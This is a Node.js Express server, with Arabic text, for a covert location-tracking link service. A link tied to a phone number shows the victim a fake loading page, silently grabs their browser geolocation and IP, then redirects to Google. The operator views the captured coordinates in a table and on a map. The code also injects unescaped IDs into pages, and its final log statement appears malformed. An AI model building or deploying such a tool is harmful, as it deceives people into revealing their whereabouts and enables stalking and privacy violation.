// ⚠️ استبدل محتوى server.js الحالي بهذا الكود ⚠️

const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات بسيطة في الذاكرة
let locations = [];

// Middleware
app.use(express.json());
app.use(express.static('public'));

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🚀 نظام تتبع المواقع</title>
            <style>
                body { font-family: Arial; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
                .container { max-width: 900px; margin: auto; background: rgba(255,255,255,0.95); padding: 30px; border-radius: 20px; color: #333; }
                h1 { color: #333; text-align: center; }
                .box { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; border-right: 5px solid #667eea; }
                code { background: #333; color: white; padding: 10px; border-radius: 5px; display: block; margin: 10px 0; }
                .btn { background: #4CAF50; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📍 نظام تتبع المواقع الجغرافية</h1>
                
                <div class="box">
                    <h3>📌 كيف تستخدم النظام:</h3>
                    <p>1. أنشئ رابط تتبع:</p>
                    <code>https://location2026-2.onrender.com/track/رقم_الهاتف</code>
                    
                    <p>2. مثال:</p>
                    <code>https://location2026-2.onrender.com/track/1234567890</code>
                    
                    <p>3. عندما يضغط الشخص على الرابط، سيتم حفظ موقعه هنا:</p>
                    <a href="/results" class="btn">📊 عرض النتائج</a>
                </div>
                
                <div class="box">
                    <h3>🔗 روابط سريعة:</h3>
                    <p>
                        <a href="/track/123456" class="btn" target="_blank">تجربة رابط تتبع</a>
                        <a href="/results" class="btn" target="_blank">عرض النتائج المسجلة</a>
                        <a href="/map" class="btn" target="_blank">عرض الخريطة</a>
                    </p>
                </div>
                
                <div class="box">
                    <h3>📊 إحصائيات:</h3>
                    <p>عدد المواقع المسجلة: <strong>${locations.length}</strong></p>
                    <p>حالة الخادم: <span style="color: #4CAF50; font-weight: bold;">✅ يعمل بشكل طبيعي</span></p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== رابط التتبع ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>جاري التحميل...</title>
            <script>
                // الحصول على الموقع الجغرافي
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            // عند النجاح
                            async (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                const accuracy = position.coords.accuracy;
                                
                                // إرسال البيانات للخادم
                                await fetch('/api/save-location', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify({
                                        id: '${userId}',
                                        latitude: lat,
                                        longitude: lon,
                                        accuracy: accuracy,
                                        timestamp: new Date().toISOString(),
                                        userAgent: navigator.userAgent
                                    })
                                });
                                
                                // توجيه المستخدم بعد 2 ثانية
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 2000);
                            },
                            // عند الفشل
                            (error) => {
                                console.log('Error:', error);
                                // توجيهه حتى لو فشل
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 2000);
                            }
                        );
                    } else {
                        alert('المتصفح لا يدعم تحديد الموقع');
                        window.location.href = 'https://www.google.com';
                    }
                }
                
                // تشغيل عند تحميل الصفحة
                window.onload = getLocation;
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    text-align: center;
                }
                .loader {
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #3498db;
                    border-radius: 50%;
                    width: 50px;
                    height: 50px;
                    animation: spin 2s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div>
                <h1>جاري التحميل...</h1>
                <p>يرجى الانتظار بينما يتم تحميل المحتوى</p>
                <div class="loader"></div>
                <p>سيتم توجيهك تلقائياً خلال ثوانٍ</p>
                <p style="font-size: 12px; opacity: 0.7;">ID: ${userId}</p>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع ==========
app.post('/api/save-location', (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA')
        };
        
        locations.push(locationData);
        
        // طباعة في السجل
        console.log('📍 موقع جديد مسجل:', {
            id: locationData.id,
            location: `${locationData.latitude}, ${locationData.longitude}`,
            accuracy: `${locationData.accuracy}m`,
            time: locationData.time
        });
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع بنجاح',
            count: locations.length 
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    let html = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                table { width: 100%; border-collapse: collapse; background: white; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #ddd; }
                th { background: #4CAF50; color: white; }
                tr:hover { background: #f5f5f5; }
                .map-link { color: #2196F3; text-decoration: none; }
                .map-link:hover { text-decoration: underline; }
                h1 { color: #333; }
                .btn { background: #4CAF50; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block; margin: 10px 0; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ عرض الخريطة</a>
            <p>عدد السجلات: <strong>${locations.length}</strong></p>
            <table>
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>الدقة</th>
                    <th>الوقت</th>
                    <th>رابط الخريطة</th>
                </tr>
    `;
    
    // عرض أحدث النتائج أولاً
    [...locations].reverse().forEach(loc => {
        html += `
                <tr>
                    <td>${loc.id}</td>
                    <td>${loc.latitude}, ${loc.longitude}</td>
                    <td>${loc.accuracy ? loc.accuracy + ' متر' : '--'}</td>
                    <td>${loc.time}</td>
                    <td>
                        <a class="map-link" href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank">
                            👁️ عرض على الخريطة
                        </a>
                    </td>
                </tr>
        `;
    });
    
    html += `
            </table>
        </body>
        </html>
    `;
    
    res.send(html);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 500px; width: 100%; }
                body { margin: 0; padding: 20px; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                // البيانات من الخادم
                const locations = ${JSON.stringify(locations)};
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        L.marker([loc.latitude, loc.longitude])
                         .addTo(map)
                         .bindPopup('<b>رقم: ' + loc.id + '</b><br>الوقت: ' + loc.time);
                    }
                });
                
                // إذا كان هناك مواقع، ضبط العرض
                if(locations.length > 0 && locations[0].latitude) {
                    map.setView([locations[0].latitude, locations[0].longitude], 13);
                }
            </script>
            <br>
            <a href="/results" style="background: #4CAF50; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">عودة للنتائج</a>
        </body>
        </html>
    `);
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(\`
    🚀 الخادم يعمل على المنفذ \${PORT}
    🌐 رابط الوصول: http://localhost:\${PORT}
    
    📌 روابط مهمة:
    1. الصفحة الرئيسية: /
    2. رابط تتبع: /track/رقم_الهاتف
    3. النتائج: /results
    4. الخريطة: /map
    
    ⚡ النظام جاهز لاستقبال طلبات التتبع!
    \`);
});
